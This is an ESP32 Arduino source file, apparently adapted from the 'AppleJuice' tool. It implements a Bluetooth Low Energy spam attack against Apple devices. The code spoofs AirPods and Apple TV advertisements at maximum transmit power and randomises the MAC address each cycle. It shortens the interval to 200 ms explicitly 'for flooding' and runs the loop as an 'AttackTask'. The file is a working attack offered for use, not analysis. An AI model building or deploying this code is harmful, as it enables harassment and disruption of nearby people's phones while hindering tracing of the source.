#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEAdvertising.h>
#include <esp_arduino_version.h>
#include "applejuice.h"
#include "devices.hpp"

// Board-specific LED / GPIO tricks from the original tool are removed:
// on the Guition ESP32-4848S040 those pins belong to the display bus.

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
#endif

BLEAdvertising *pAdvertising;
// Flood rate: ~5 advertisement cycles per second (was 800 ms in the
// original tool, which was tuned for single popups, not flooding).
static const uint32_t delayMilliseconds = 200;

volatile unsigned int applejuice_cycles = 0;

static volatile bool applejuice_flag = false;
static TaskHandle_t attackTaskHandle = NULL;
static int i = 0;

void applejuice_init() {
  BLEDevice::init("AirPods 69");

  // Increase the BLE power to max
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // Random device address for the advertisements
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
#if defined(ESP_ARDUINO_VERSION_MAJOR) && (ESP_ARDUINO_VERSION_MAJOR >= 3)
  // NimBLE host: set the random identity address used for advertising
  BLEDevice::setOwnAddr(null_addr);
  BLEDevice::setOwnAddrType(1);  // BLE_OWN_ADDR_RANDOM
#else
  // Bluedroid host (core 2.x)
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
#endif
}

static void attack() {
  while (applejuice_flag) {
    // First generate fake random MAC
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int j = 0; j < 6; j++) {
      dummy_addr[j] = random(256);
      // It seems for some reason first 4 bits
      // need to be high (aka 0b1111)
      if (j == 0) {
        dummy_addr[j] |= 0xF0;
      }
    }

    BLEAdvertisementData oAdvertisementData;

    // Randomly pick data from one of the devices
    // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
    if (random(2) == 0) {
      int index = random(17);
#if defined(ESP_ARDUINO_VERSION_MAJOR) && (ESP_ARDUINO_VERSION_MAJOR >= 3)
      oAdvertisementData.addData(String((char *)DEVICES[index], 31));
#else
      oAdvertisementData.addData(std::string((char *)DEVICES[index], 31));
#endif
    } else {
      int index = random(13);
#if defined(ESP_ARDUINO_VERSION_MAJOR) && (ESP_ARDUINO_VERSION_MAJOR >= 3)
      oAdvertisementData.addData(String((char *)SHORT_DEVICES[index], 23));
#else
      oAdvertisementData.addData(std::string((char *)SHORT_DEVICES[index], 23));
#endif
    }

    int adv_type_choice = random(3);
#if defined(ESP_ARDUINO_VERSION_MAJOR) && (ESP_ARDUINO_VERSION_MAJOR >= 3)
    if (adv_type_choice == 0) {
      // connectable undirected (like ADV_TYPE_IND)
      pAdvertising->setScanResponse(true);
      pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_UND);
    } else if (adv_type_choice == 1) {
      // scannable non-connectable (like ADV_TYPE_SCAN_IND)
      pAdvertising->setScanResponse(true);
      pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
    } else {
      // non-connectable, non-discoverable (like ADV_TYPE_NONCONN_IND)
      pAdvertising->setScanResponse(false);
      pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
    }

    // Set the device address, advertisement data
    BLEDevice::setOwnAddr(dummy_addr);
#else
    if (adv_type_choice == 0) {
      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
    } else if (adv_type_choice == 1) {
      pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    } else {
      pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }

    // Set the device address, advertisement data
    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
#endif
    pAdvertising->setAdvertisementData(oAdvertisementData);

    // Start advertising
    pAdvertising->start();

    delay(delayMilliseconds);
    pAdvertising->stop();

    // Random signal strength increases the difficulty of tracking the signal
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    applejuice_cycles++;
  }
}

void start_attack_task() {
  if (applejuice_flag) return;
  applejuice_flag = true;
  xTaskCreatePinnedToCore(
    [](void *param) {
      attack();
      vTaskDelete(NULL);
    },
    "AttackTask",
    8192,
    nullptr,
    1,
    &attackTaskHandle,
    1
  );
}

void stop_attack_task() {
  applejuice_flag = false;
  if (attackTaskHandle != NULL) {
    vTaskDelete(attackTaskHandle);
    attackTaskHandle = NULL;
  }
  pAdvertising->stop();
}
